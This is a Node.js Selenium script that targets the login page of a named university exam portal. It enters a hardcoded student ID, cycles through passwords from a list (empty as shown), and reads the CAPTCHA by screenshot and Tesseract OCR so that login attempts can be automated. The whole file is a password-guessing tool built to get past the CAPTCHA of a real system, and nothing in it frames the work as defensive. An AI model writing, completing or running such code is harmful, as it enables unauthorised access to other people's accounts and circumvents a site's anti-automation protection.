const { Builder, By, Key, util } = require("selenium-webdriver");
const chrome = require("selenium-webdriver/chrome");
const tesseract = require("node-tesseract-ocr");
const fs = require("fs");
const sharp = require("sharp");
const config = {
  lang: "eng",
  tessedit_char_whitelist:
    "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
};

const driver = new Builder().forBrowser("chrome").build();
var nextpass = 0;
var baseimg = "a";
var cropimg = "b";

async function login() {
  await driver.get("http://exams.kluniversity.in/");
  await driver
    .findElement(By.id("MainContent_Txtusername"))
    .sendKeys("170031332");
}

async function password() {
  driver.findElement(By.id("MainContent_Txtpassword")).clear();
  let pass =[];
  console.log(nextpass);
  await driver
    .findElement(By.id("MainContent_Txtpassword"))
    .sendKeys(pass[nextpass]);
}

async function captchaCap() {
  //driver.findElement(By.id("MainContent_Txtusername"));
  await driver.takeScreenshot().then(function(data) {
    fs.writeFileSync(baseimg, data, "base64");
  });
}

async function captchaCrop() {
  await sharp(baseimg)
    .extract({ width: 520, height: 120, left: 800, top: 950 })
    .toFile(cropimg);
}

async function captchaEnter() {
  driver.findElement(By.id("MainContent_txtCaptcha")).clear();
  await tesseract
    .recognize(cropimg, config)
    .then(text => {
      console.log("Result:", text);
      text = text.toUpperCase();
      let finaltext = "";
      for (let i = 0; i < text.length && finaltext.length < 5; i++) {
        if (
          (text[i] >= "A" && text[i] <= "Z") ||
          (text[i] >= "0" && text[i] <= "9")
        )
          finaltext += text[i];
      }
      console.log(finaltext);
      driver.findElement(By.id("MainContent_txtCaptcha")).sendKeys(finaltext);
      finaltext = "";
    })
    .catch(error => {
      console.log(error.message);
    });
  await new Promise(done => setTimeout(done, 3800));
}

async function clickLogin() {
  await driver.findElement(By.id("MainContent_Button1")).click();
  baseimg += "a";
  cropimg += "b";
  // fs.unlink("b", function(err) {
  //   if (err) throw err;
  //   // if no error, file has been deleted successfully
  //   console.log("File deleted!");
  // });
  // fs.unlink("a", function(err) {
  //   if (err) throw err;
  //   // if no error, file has been deleted successfully
  //   console.log("File deleted!");
  // });
}

async function callfuck() {
  await captchaCap();
  await captchaCrop();
  await captchaEnter();
  await clickLogin();
}

async function main() {
  await login();
  await password();
  await callfuck();
  if (await driver.findElement(By.id("MainContent_lblwarning"))) {
    await new Promise(done => setTimeout(done, 3800));
    nextpass++;
    await password();
    await callfuck();
  }
}

main();
